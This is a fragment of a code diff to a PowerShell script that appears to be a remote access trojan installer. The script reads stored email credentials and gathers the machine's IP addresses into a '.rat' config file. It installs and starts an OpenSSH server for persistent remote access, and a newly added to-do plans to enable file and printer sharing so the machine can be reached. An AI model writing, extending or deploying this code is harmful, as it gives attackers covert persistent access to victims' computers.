@@ -36,7 +36,8 @@ $current_dir = Get-Location
 $user_name = "$env:UserName.rat"
 $your_email = Get-Content email.txt
 $email_password = Get-Content password.txt
-$target_ip = (Get-NetIPAddress -AddressFamily IPV4 -InterfaceAlias Ethernet).IPAddress
+$target_ip = Get-NetIPAddress -AddressFamily IPv4 | Select-Object InterfaceAlias, IPAddress
+
 
 # writes config file
 Add-Content -Path $user_name -Value $target_ip
@@ -69,6 +70,8 @@ mkdir $temp_folder_path
 Set-Location $temp_folder_path
 
 # enabling persistent ssh
+# to do: enable file and printer sharing so we can ping the machine, default windows install does not have it enabled
+
 # to do: check for ssh first?
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
 Start-Service sshd
